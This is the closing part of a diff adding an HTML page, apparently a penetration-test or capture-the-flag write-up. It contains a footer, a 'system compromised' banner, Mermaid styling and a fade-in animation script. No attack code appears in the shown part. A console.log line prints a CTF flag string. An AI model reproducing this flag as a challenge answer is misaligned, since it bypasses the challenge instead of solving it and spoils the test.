+                    <p><strong>&copy; 2025 Kristián Kašník</strong></p>
+                    <p>System Security | Penetration Testing | Ethical Hacking</p>
+                </div>
+            </div>
+        </footer>
+
+        <!-- BOTTOM BANNER -->
+        <div class="banner-bottom">
+            <i class="fas fa-terminal"></i> REVOLUTION ELITE PENETRATION TEST COMPLETED // SYSTEM FULLY COMPROMISED // KRISTIÁN KAŠNÍK <i class="fas fa-check-circle"></i>
+        </div>
+    </div>
+
+    <script>
+        mermaid.initialize({
+            startOnLoad: true,
+            theme: 'dark',
+            themeVariables: {
+                primaryColor: '#EE0000',
+                primaryTextColor: '#FFFFFF',
+                primaryBorderColor: '#EE0000',
+                lineColor: '#94A3B8',
+                secondaryColor: '#161B22',
+                tertiaryColor: '#0D1117',
+                background: 'transparent',
+                mainBkg: '#161B22',
+                secondBkg: '#21262D',
+                textColor: '#F1F5F9',
+                fontFamily: 'Red Hat Display, sans-serif'
+            },
+            flowchart: {
+                useMaxWidth: true,
+                htmlLabels: true,
+                curve: 'basis'
+            }
+        });
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.opacity = '1';
+                    entry.target.style.transform = 'translateY(0)';
+                }
+            });
+        }, { threshold: 0.1 });
+
+        document.querySelectorAll('.section-card').forEach(card => {
+            card.style.opacity = '0';
+            card.style.transform = 'translateY(20px)';
+            card.style.transition = 'all 0.6s ease';
+            observer.observe(card);
+        });
+
+        console.log('%c⚡ REVOLUTION ELITE PENETRATION TEST', 'color: #EE0000; font-size: 18px; font-weight: bold;');
+        console.log('%c💀 System Compromised by Kristián Kašník', 'color: #E53E3E; font-size: 14px;');
+        console.log('%c🏆 CTF Flag: CTF{r3v0lut10n_3l1t3_r00t_c0mpr0m1s3d}', 'color: #10B981; font-size: 12px;');
+    </script>
+</body>
+</html>
